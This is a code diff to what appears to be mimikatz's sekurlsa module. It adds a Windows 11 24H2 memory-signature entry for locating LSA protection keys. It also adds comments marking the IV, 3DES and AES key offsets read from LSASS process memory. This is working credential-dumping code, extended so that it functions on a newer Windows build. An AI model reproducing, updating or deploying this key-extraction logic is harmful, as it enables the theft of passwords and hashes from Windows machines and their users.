@@ -21,6 +21,7 @@ KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // Init
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
 	{KULL_M_WIN_BUILD_11_22H2,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {71, -89, 16}},
+	{KULL_M_WIN_BUILD_11_24H2,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {71, -89, 16}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_LsaInitializeProtectedMemory_KEY[]	= {0x6a, 0x02, 0x6a, 0x10, 0x68};
@@ -159,10 +160,11 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 	PKULL_M_PATCH_GENERIC currentReference;
 	if(currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), cLsass->osContext.BuildNumber))
 	{
+
 		aLocalMemory.address = currentReference->Search.Pattern;
 		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
 		{
-			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
+			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; //iv offset
 			#if defined(_M_ARM64)
 			if(aLsassMemory.address = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0))
 			{
@@ -179,7 +181,8 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 				aLocalMemory.address = InitializationVector;
 				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
 				{
-					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
+
+					aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1; //des offset
 					if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des, 
 						#if defined(_M_ARM64)
 						currentReference->Offsets.armOff1
@@ -188,7 +191,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 						#endif
 						))
 					{
-						aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
+						aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2; //aes offset
 						if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes,
 							#if defined(_M_ARM64)
 							currentReference->Offsets.armOff2
@@ -196,7 +199,9 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 							0
 							#endif
 							))
+						{
 							status = STATUS_SUCCESS;
+						}
 					}
 				}
 			}
